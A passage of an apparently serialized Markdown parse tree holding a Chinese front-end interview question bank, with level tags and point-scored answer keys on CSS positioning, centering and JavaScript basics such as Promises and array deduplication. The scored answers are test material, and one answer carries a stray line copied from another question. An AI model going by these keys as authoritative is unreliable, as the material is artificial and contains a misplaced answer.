left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","tokens":[{"type":"text","raw":"粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","text":"粘性定位的元素是依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换。它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位。这个特定阈值指的是 top, right, bottom 或 left\\n之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## display:inline-block 什么时候会显示间隙？\\n\\n","depth":2,"text":"display:inline-block 什么时候会显示间隙？","tokens":[{"type":"text","raw":"display:inline-block 什么时候会显示间隙？","text":"display:inline-block 什么时候会显示间隙？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 有空格时会有间隙，可以删除空格解决；\\n\\n- margin正值时，可以让margin使用负值解决；\\n\\n- 使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 有空格时会有间隙，可以删除空格解决；\\n\\n","task":false,"loose":true,"text":"有空格时会有间隙，可以删除空格解决；\\n","tokens":[{"type":"text","raw":"有空格时会有间隙，可以删除空格解决；\\n","text":"有空格时会有间隙，可以删除空格解决；","tokens":[{"type":"text","raw":"有空格时会有间隙，可以删除空格解决；","text":"有空格时会有间隙，可以删除空格解决；","escaped":false}]}]},{"type":"list_item","raw":"- margin正值时，可以让margin使用负值解决；\\n\\n","task":false,"loose":true,"text":"margin正值时，可以让margin使用负值解决；\\n","tokens":[{"type":"text","raw":"margin正值时，可以让margin使用负值解决；\\n","text":"margin正值时，可以让margin使用负值解决；","tokens":[{"type":"text","raw":"margin正值时，可以让margin使用负值解决；","text":"margin正值时，可以让margin使用负值解决；","escaped":false}]}]},{"type":"list_item","raw":"- 使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","task":false,"loose":true,"text":"使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","tokens":[{"type":"text","raw":"使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","text":"使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","tokens":[{"type":"text","raw":"使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","text":"使用font-size解决，给父元素设置font-size:0，子元素再设置font-size；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## ::before 和 :after 的双冒号和单冒号有什么区别？\\n\\n","depth":2,"text":"::before 和 :after 的双冒号和单冒号有什么区别？","tokens":[{"type":"text","raw":"::before 和 :after 的双冒号和单冒号有什么区别？","text":"::before 和 :after 的双冒号和单冒号有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- 冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","task":false,"loose":false,"text":"冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","tokens":[{"type":"text","raw":"冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","text":"冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","tokens":[{"type":"text","raw":"冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","text":"冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。 （2）::before就是以一个子元素的存在，定义在元素主体内容之前的一个伪元素。并不存在于dom之中，只存在在页面之中。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## CSS 居中\\n\\n","depth":2,"text":"CSS 居中","tokens":[{"type":"text","raw":"CSS 居中","text":"CSS 居中","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：定位居中**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：定位居中**","task":false,"loose":false,"text":"**1：定位居中**","tokens":[{"type":"text","raw":"**1：定位居中**","text":"**1：定位居中**","tokens":[{"type":"strong","raw":"**1：定位居中**","text":"1：定位居中","tokens":[{"type":"text","raw":"1：定位居中","text":"1：定位居中","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"①已知大小的元素在屏幕窗口水平垂直都居中","text":"①已知大小的元素在屏幕窗口水平垂直都居中","tokens":[{"type":"text","raw":"①已知大小的元素在屏幕窗口水平垂直都居中","text":"①已知大小的元素在屏幕窗口水平垂直都居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<!DOCTYPE html>\\n<html lang=\\"en\\">\\n<head>\\n    <meta charset=\\"UTF-8\\">\\n    <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n    <meta http-equiv=\\"X-UA-Compatible\\" content=\\"ie=edge\\">\\n    <title></title>\\n    <style>\\n        .box{\\n            width:100px;\\n            height:100px;\\n            background-color: aqua;\\n            position:fixed;\\n            left:50%;\\n            top:50%;\\n            margin-left:-50px;\\n            margin-top:-50px;\\n        }\\n    </style>\\n</head>\\n<body>\\n    <div class=\\"box\\">\\n\\n    </div>\\n</body>\\n</html>\\n```","lang":"html","text":"<!DOCTYPE html>\\n<html lang=\\"en\\">\\n<head>\\n    <meta charset=\\"UTF-8\\">\\n    <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n    <meta http-equiv=\\"X-UA-Compatible\\" content=\\"ie=edge\\">\\n    <title></title>\\n    <style>\\n        .box{\\n            width:100px;\\n            height:100px;\\n            background-color: aqua;\\n            position:fixed;\\n            left:50%;\\n            top:50%;\\n            margin-left:-50px;\\n            margin-top:-50px;\\n        }\\n    </style>\\n</head>\\n<body>\\n    <div class=\\"box\\">\\n\\n    </div>\\n</body>\\n</html>"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"②未知大小的元素在屏幕窗口水平垂直都居中","text":"②未知大小的元素在屏幕窗口水平垂直都居中","tokens":[{"type":"text","raw":"②未知大小的元素在屏幕窗口水平垂直都居中","text":"②未知大小的元素在屏幕窗口水平垂直都居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<!DOCTYPE html>\\n<html lang=\\"en\\">\\n<head>\\n    <meta charset=\\"UTF-8\\">\\n    <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n    <meta http-equiv=\\"X-UA-Compatible\\" content=\\"ie=edge\\">\\n    <title></title>\\n    <style>\\n        .box{\\n            position:fixed;\\n            left:0;\\n            top:0;\\n            right:0;\\n            bottom:0;\\n            margin:auto;\\n        }\\n    </style>\\n</head>\\n<body>\\n    <div class=\\"box\\">\\n\\n    </div>\\n</body>\\n</html>\\n```","lang":"html","text":"<!DOCTYPE html>\\n<html lang=\\"en\\">\\n<head>\\n    <meta charset=\\"UTF-8\\">\\n    <meta name=\\"viewport\\" content=\\"width=device-width, initial-scale=1.0\\">\\n    <meta http-equiv=\\"X-UA-Compatible\\" content=\\"ie=edge\\">\\n    <title></title>\\n    <style>\\n        .box{\\n            position:fixed;\\n            left:0;\\n            top:0;\\n            right:0;\\n            bottom:0;\\n            margin:auto;\\n        }\\n    </style>\\n</head>\\n<body>\\n    <div class=\\"box\\">\\n\\n    </div>\\n</body>\\n</html>"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：子元素在父元素中居中**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：子元素在父元素中居中**","task":false,"loose":false,"text":"**1：子元素在父元素中居中**","tokens":[{"type":"text","raw":"**1：子元素在父元素中居中**","text":"**1：子元素在父元素中居中**","tokens":[{"type":"strong","raw":"**1：子元素在父元素中居中**","text":"1：子元素在父元素中居中","tokens":[{"type":"text","raw":"1：子元素在父元素中居中","text":"1：子元素在父元素中居中","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"①已知大小的子元素在父元素中居中","text":"①已知大小的子元素在父元素中居中","tokens":[{"type":"text","raw":"①已知大小的子元素在父元素中居中","text":"①已知大小的子元素在父元素中居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n    父元素{\\n        /* 相对定位 */\\n        position: relative;\\n    }\\n    子元素{\\n        width:100px;\\n        height:100px;\\n        /* 绝对定位 */\\n        position:absolute;\\n        left:50%;\\n        top:50%;\\n        margin-left:-50px;\\n        margin-top:-50px;\\n    }\\n```","lang":"css","text":"    父元素{\\n        /* 相对定位 */\\n        position: relative;\\n    }\\n    子元素{\\n        width:100px;\\n        height:100px;\\n        /* 绝对定位 */\\n        position:absolute;\\n        left:50%;\\n        top:50%;\\n        margin-left:-50px;\\n        margin-top:-50px;\\n    }"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"②未知大小的子元素在父元素中居中","text":"②未知大小的子元素在父元素中居中","tokens":[{"type":"text","raw":"②未知大小的子元素在父元素中居中","text":"②未知大小的子元素在父元素中居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  父元素{\\n      /* 相对定位 */\\n      position: relative;\\n  }\\n  子元素{\\n      /* 绝对定位 */\\n      position:absolute;\\n      left:0;\\n      top:0;\\n      right:0;\\n      bottom:0;\\n      margin:auto;\\n  }\\n```","lang":"css","text":"  父元素{\\n      /* 相对定位 */\\n      position: relative;\\n  }\\n  子元素{\\n      /* 绝对定位 */\\n      position:absolute;\\n      left:0;\\n      top:0;\\n      right:0;\\n      bottom:0;\\n      margin:auto;\\n  }"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：使用弹性布局**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：使用弹性布局**","task":false,"loose":false,"text":"**1：使用弹性布局**","tokens":[{"type":"text","raw":"**1：使用弹性布局**","text":"**1：使用弹性布局**","tokens":[{"type":"strong","raw":"**1：使用弹性布局**","text":"1：使用弹性布局","tokens":[{"type":"text","raw":"1：使用弹性布局","text":"1：使用弹性布局","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"① 使用flex布局的方式实现未知大小元素在屏幕窗口水平垂直都居中","text":"① 使用flex布局的方式实现未知大小元素在屏幕窗口水平垂直都居中","tokens":[{"type":"text","raw":"① 使用flex布局的方式实现未知大小元素在屏幕窗口水平垂直都居中","text":"① 使用flex布局的方式实现未知大小元素在屏幕窗口水平垂直都居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  html,body{\\n      height:100%;\\n  }\\n  /* 让html和body的高度为屏幕窗口的高度（窗口高度自适应） */\\n  body{\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }\\n```","lang":"css","text":"  html,body{\\n      height:100%;\\n  }\\n  /* 让html和body的高度为屏幕窗口的高度（窗口高度自适应） */\\n  body{\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"② 使用flex布局的方式实现未知大小的子元素在父元素中水平垂直都居中**","text":"② 使用flex布局的方式实现未知大小的子元素在父元素中水平垂直都居中**","tokens":[{"type":"text","raw":"② 使用flex布局的方式实现未知大小的子元素在父元素中水平垂直都居中**","text":"② 使用flex布局的方式实现未知大小的子元素在父元素中水平垂直都居中**","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  父元素 {\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }\\n    \\n```","lang":"css","text":"  父元素 {\\n      display:flex;\\n      justify-content:center;\\n      align-items:center;\\n  }\\n    "},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：使用css3变形来实现**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：使用css3变形来实现**","task":false,"loose":false,"text":"**1：使用css3变形来实现**","tokens":[{"type":"text","raw":"**1：使用css3变形来实现**","text":"**1：使用css3变形来实现**","tokens":[{"type":"strong","raw":"**1：使用css3变形来实现**","text":"1：使用css3变形来实现","tokens":[{"type":"text","raw":"1：使用css3变形来实现","text":"1：使用css3变形来实现","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"① 使用css3变形的方式实现未知大小的元素在屏幕窗口水平垂直都居中","text":"① 使用css3变形的方式实现未知大小的元素在屏幕窗口水平垂直都居中","tokens":[{"type":"text","raw":"① 使用css3变形的方式实现未知大小的元素在屏幕窗口水平垂直都居中","text":"① 使用css3变形的方式实现未知大小的元素在屏幕窗口水平垂直都居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  元素{\\n      position:fixed;\\n      left:50%;\\n      top:50%;\\n      transform:translateX(-50%) translateY(-50%);\\n  }\\n```","lang":"css","text":"  元素{\\n      position:fixed;\\n      left:50%;\\n      top:50%;\\n      transform:translateX(-50%) translateY(-50%);\\n  }"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"② 使用css变形的方式来实现未知大小的子元素，在父元素中水平垂直都居中","text":"② 使用css变形的方式来实现未知大小的子元素，在父元素中水平垂直都居中","tokens":[{"type":"text","raw":"② 使用css变形的方式来实现未知大小的子元素，在父元素中水平垂直都居中","text":"② 使用css变形的方式来实现未知大小的子元素，在父元素中水平垂直都居中","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```css\\n  父元素{\\n      position:relative;\\n  }\\n  子元素{\\n      position:absolute;\\n      left:50%;\\n      top:50%;\\n      transform:translate(-50%,-50%);\\n  }\\n```","lang":"css","text":"  父元素{\\n      position:relative;\\n  }\\n  子元素{\\n      position:absolute;\\n      left:50%;\\n      top:50%;\\n      transform:translate(-50%,-50%);\\n  }"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n","pre":false,"text":"</details>\\n"}]},{"key":"JavaScript","content":"<h1>JavaScript</h1>\\n<h2>JS 数据类型有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 基本类型：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol（ES6特性）、BigInt（ES11特性）；</li>\\n<li><strong>1：</strong> 引用类型：对象（Object）、函数（Function）、数组（Array）等；</li>\\n</ul>\\n<h2>== 和 === 的区别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> == 是 宽松相等，会进行类型转换，比较前会先转换两边的操作数类型（例如，&#39;5&#39; == 5 为 true;</li>\\n<li><strong>1：</strong> === 是 严格相等，不会进行类型转换，只有两边的值和类型都相同才会返回 true（例如，&#39;5&#39; === 5 为 false;</li>\\n</ul>\\n<h2>var 、let 、 const 的区别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> var 作用域: 函数作用域（如果在函数内部声明），全局作用域（如果在函数外部声明）;\\n        提升: 声明和初始化都会被提升（变量提升，但未初始化时是 undefined）;</li>\\n<li><strong>1：</strong> let、 const 作用域: 级作用域（只在其所在的代码块内有效）;\\n    提升: 变量提升但不会初始化，存在“暂时性死区”，即在声明之前不能访问;</li>\\n<li><strong>1：</strong> 区别:\\n      const： 需要在声明时初始化，且之后不能被修改;\\n      let：可以修改其值;\\n      var： 是函数作用域或全局作用域，let 和 const 是块级作用域;</li>\\n</ul>\\n<h2>什么是事件冒泡和事件捕获？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 事件冒泡：事件从目标元素开始，向上冒泡到 document;</li>\\n<li><strong>1：</strong> 事件捕获：事件从 document 开始，向下捕获到目标元素;</li>\\n<li><strong>1：</strong> 事件流顺序: 1.捕获 -&gt; 2.目标 -&gt; 3.冒泡;</li>\\n<li><strong>2：</strong> 引用类型：对象（Object）、函数（Function）、数组（Array）等；</li>\\n</ul>\\n<h2>JS 什么是防抖和节流？它们的应用场景有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 防抖：在事件被触发后，延迟一定时间后再执行回调函数，如果在延迟时间内再次触发事件，则重新计算延迟时间，直到延迟时间结束后才执行回调函数。例如，在用户输入搜索框时，防止频繁发送请求，可以使用防抖函数，只有在用户停止输入一段时间后才发送搜索请求。</li>\\n<li><strong>2：</strong> 节流：在一定时间内，只允许函数执行一次。例如，在页面滚动时，需要频繁执行某个函数来处理滚动事件，但为了避免函数执行过于频繁影响性能，可以使用节流函数，限制函数在一定时间内只执行一次。</li>\\n</ul>\\n<h2>JS 请解释在 JavaScript 中this指针的工作原理，在以下函数调用场景中this指向什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code></h4>\\n<pre><code class=\\"language-js\\">const person = {\\n    name: &quot;张三&quot;,\\n    sayHello: function() {\\n        console.log(`你好，我的名字叫 ${this.name}`);\\n    }\\n};\\nperson.sayHello();\\n</code></pre>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在person.sayHello()调用中，this指向person对象。</li>\\n<li><strong>1：</strong> 当一个函数作为对象的方法被调用时，this指向调用该方法的对象。在这里，sayHello是person对象的方法，所以this指代person，因此可以正确访问person.name</li>\\n</ul>\\n<h2>JS 请解释setTimeout和setInterval的区别，并说明如何清除定时器</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> setTimeout：在指定的延迟时间（毫秒）后执行一次回调函数。示例：setTimeout(() =&gt; console.log(&#39;Delayed&#39;), 1000);，1 秒后会执行一次回调打印Delayed。\\nsetInterval：按照指定的时间间隔（毫秒）重复执行回调函数。示例：let intervalId = setInterval(() =&gt; console.log(&#39;Repeating&#39;), 1000);，每隔 1 秒就会执行一次回调打印Repeating。</li>\\n<li><strong>1：</strong> 使用clearTimeout清除setTimeout创建的定时器，传入setTimeout返回的定时器 ID。例如：const timeoutId = setTimeout(() =&gt; console.log(&#39;Timeout&#39;), 2000); clearTimeout(timeoutId);，这样就会取消即将执行的setTimeout回调。\\n    使用clearInterval清除setInterval创建的定时器，传入setInterval返回的定时器 ID，如clearInterval(intervalId);会停止setInterval的重复执行。</li>\\n</ul>\\n<h2>Promise 的常用方法</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Promise.resolve(value)：返回一个已解决的 Promise，如果 value 是一个 Promise，返回的 Promise 会继承其状态。</li>\\n<li><strong>1：</strong> Promise.reject(reason)：返回一个已拒绝的 Promise，带有拒绝的原因。</li>\\n<li><strong>1：</strong> Promise.all(iterable)：接收一个可迭代对象，返回一个新的 Promise，当所有 Promise 都成功时返回结果数组，若有任何 Promise 失败，返回的 Promise 会立即失败。</li>\\n<li><strong>1：</strong> Promise.race(iterable)：返回一个 Promise，它会在第一个完成的 Promise 状态改变时返回该 Promise 的结果（无论是成功还是失败）。</li>\\n<li><strong>1：</strong> Promise.allSettled(iterable)：返回一个新的 Promise，在所有输入的 Promise 完成时返回，结果包含每个 Promise 的状态及其结果。</li>\\n<li><strong>1：</strong> Promise.any(iterable)：返回一个新的 Promise，它会在第一个成功的 Promise 完成时返回成功结果，如果所有的 Promise 都失败，则返回一个拒绝的 Promise。</li>\\n<li><strong>1：</strong> Promise.finally(onFinally)：无论 Promise 成功或失败，都会执行 onFinally 回调，常用于清理操作。</li>\\n</ul>\\n<h2>解释 Set 和 Map 的使用及区别</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：W5</h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Set：是一个集合，用于存储不重复的值，按照插入顺序排列。</li>\\n<li><strong>1：</strong> Map：是一个键值对集合，用于存储键值对，可以存储任何类型的键和值。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">// Set\\nlet set = new Set();\\nset.add(1);\\nset.add(2);\\nset.add(2); // 会被忽略\\nconsole.log(set); // Set { 1, 2 }\\n\\n// Map\\nlet map = new Map();\\nmap.set(&#39;name&#39;, &#39;Alice&#39;);\\nmap.set(&#39;age&#39;, 25);\\nconsole.log(map.get(&#39;name&#39;)); // Alice\\n</code></pre>\\n<h2>请写出几个 JavaScript 函数，用于实现数组去重</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（8 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 方法一：使用Set对象（ES6 及以上）</li>\\n</ul>\\n<pre><code class=\\"language-js\\">//原理：Set是一种新的数据结构，它类似于数组，但是成员的值都是唯一的。可以将数组转换为Set，然后再转换回数组来实现去重。\\nfunction uniqueArray(arr) {\\n    return [...new Set(arr)];\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\nconsole.log(uniqueArray(array)); // 输出[1, 2, 3, 4]\\n//解释：new Set(array)会创建一个Set对象，其中包含了array中的所有元素，并且自动去重。然后，通过扩展运算符...将Set对象转换回数组，得到去重后的结果。\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 方法二：使用循环和一个新数组</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function uniqueArray(arr) {\\n    let newArray = [];\\n    for (let i = 0; i &lt; arr.length; i++) {\\n        if (!newArray.includes(arr[i])) {\\n            newArray.push(arr[i]);\\n        }\\n    }\\n    return newArray;\\n}\\nlet array = [1, 2, 2, 3, 4, 4];\\n    console.log(uniqueArray(array)); // 输出[1, 2, 3, 4]\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 方法三：使用filter方法和indexOf函数</li>\\n</ul>\\n<pre><code class=\\"language-js\\">//原理：filter方法用于过滤数组中的元素，indexOf函数用于查找元素在数组中的首次出现位置。通过filter方法遍历数组，只保留首次出现的元素，从而实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.filter((element, index, self) =&gt; {\\n    return self.indexOf(element) === index;\\n});\\nconsole.log(uniqueArray);\\n//解释：filter方法的回调函数接收三个参数：element（当前元素）、index（当前元素的索引）和self（数组本身）。在回调函数中，self.indexOf(element)会查找element在数组中的首次出现位置。如果这个位置等于当前元素的索引index，说明这个元素是首次出现的，filter方法会保留这个元素；否则，就过滤掉这个元素。最终filter方法返回一个新的去重后的数组。\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 方法四：使用reduce方法</li>\\n</ul>\\n<pre><code class=\\"language-js\\">//原理：reduce方法用于对数组中的每个元素执行一个由您提供的reducer函数（升序执行），将其结果汇总为单个返回值。可以利用reduce方法来构建一个新的去重数组。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = array.reduce((acc, cur) =&gt; {\\n    if (!acc.includes(cur)) {\\n        acc.push(cur);\\n    }\\n    return acc;\\n}, []);\\nconsole.log(uniqueArray);\\n//解释：reduce方法的第一个参数是一个reducer函数，它接收两个参数：acc（累加器，初始值是一个空数组[]）和cur（当前元素）。在reducer函数中，如果acc数组不包含cur元素（acc.includes(cur)返回false），就将cur添加到acc中。最后，reduce方法返回acc，即去重后的数组。\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 方法五：使用Object对象（以元素为键）</li>\\n</ul>\\n<pre><code class=\\"language-js\\">//原理：利用Object的键的唯一性，将数组元素作为对象的键，值可以任意设置（这里设置为true），然后获取对象的键并转换回数组来实现去重。\\nlet array = [1, 2, 2, 3, 4, 4];\\nlet uniqueArray = [];\\nlet tempObj = {};\\nfor (let i = 0; i &lt; array.length; i++) {\\n    let current = array[i];\\n    if (!tempObj[current]) {\\n        uniqueArray.push(current);\\n        tempObj[current] = true;\\n    }\\n}\\nconsole.log(uniqueArray);\\n//解释：首先创建一个空数组uniqueArray用于存储去重后的元素，以及一个空对象tempObj。然后遍历array数组，对于每个元素current，检查tempObj对象中是否已经存在以current为键的属性（tempObj[current]是否为true）。如果不存在，就将current添加到uniqueArray中，并在tempObj中添加一个以current为键，值为true的属性。这样，利用对象键的唯一性实现了数组去重。最后返回uniqueArray。\\n</code></pre>\\n</details>\\n\\n<h2>ES6 和 CommonJS 